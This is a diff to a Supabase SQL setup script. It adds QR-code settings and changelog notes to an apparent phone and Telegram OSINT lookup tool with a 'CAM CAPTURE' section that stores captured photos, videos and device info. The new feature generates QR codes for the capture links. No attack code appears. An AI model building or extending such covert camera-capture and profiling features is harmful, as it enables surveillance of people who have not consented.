@@ -3,7 +3,7 @@
 -- =====================================================
 -- Run this SQL in your new Supabase project's SQL Editor
 -- Last Updated: 2026-02-04
--- Version: 3.5 (Border Effects Toggle Settings)
+-- Version: 3.6 (QR Code Generator + Settings)
 -- =====================================================
 
 -- =====================================================
@@ -331,6 +331,10 @@ VALUES ('main_settings', '{
   "callDarkMaxDuration": 20,
   "headerBorderEnabled": true,
   "tabContainerBorderEnabled": true,
+  "qrSize": 180,
+  "qrFgColor": "#22c55e",
+  "qrBgColor": "#000000",
+  "qrIncludeLogo": false,
   "tabs": [
     {"id": "phone", "label": "Phone", "icon": "Phone", "color": "green", "placeholder": "Enter phone number...", "searchType": "phone", "apiUrl": "", "enabled": true},
     {"id": "numinfov2", "label": "NUM INFO V2", "icon": "Search", "color": "cyan", "placeholder": "Enter phone number...", "searchType": "numinfov2", "apiUrl": "", "enabled": true},
@@ -374,7 +378,7 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- =====================================================
 -- EDGE FUNCTIONS LIST (deploy from supabase/functions/)
 -- =====================================================
--- Version 3.5 Edge Functions:
+-- Version 3.6 Edge Functions:
 -- 1. auth-login        - User login with credit password
 -- 2. auth-verify       - Verify session token & get credits
 -- 3. credits-deduct    - Deduct credits for search operations
@@ -383,6 +387,13 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- 6. numinfo-v2        - Phone number info API
 -- 7. telegram-osint    - Telegram OSINT API integration
 -- 8. call-dark         - Omnidim AI call dispatch API
+--
+-- IMPORTANT CHANGES in v3.6:
+-- - QR Code Generator added to CAM CAPTURE section
+-- - New QR tab with link type selector (photo/video/custom/chrome/iframe)
+-- - QR customization: size, colors, presets
+-- - Download QR as PNG with session ID
+-- - qrSize, qrFgColor, qrBgColor, qrIncludeLogo settings
 --
 -- IMPORTANT CHANGES in v3.5:
 -- - Border Effects toggle added in Admin Panel
@@ -418,6 +429,8 @@ ON CONFLICT (setting_key) DO NOTHING;
 --                       camIframeUrl for embedding external URLs
 --                     - Includes Border Effects (v3.5):
 --                       headerBorderEnabled, tabContainerBorderEnabled
+--                     - Includes QR Code Generator (v3.6):
+--                       qrSize, qrFgColor, qrBgColor, qrIncludeLogo
 -- captured_photos   : Camera capture photo metadata + device info
 -- captured_videos   : Video capture metadata & URLs
 -- search_history    : All search queries log
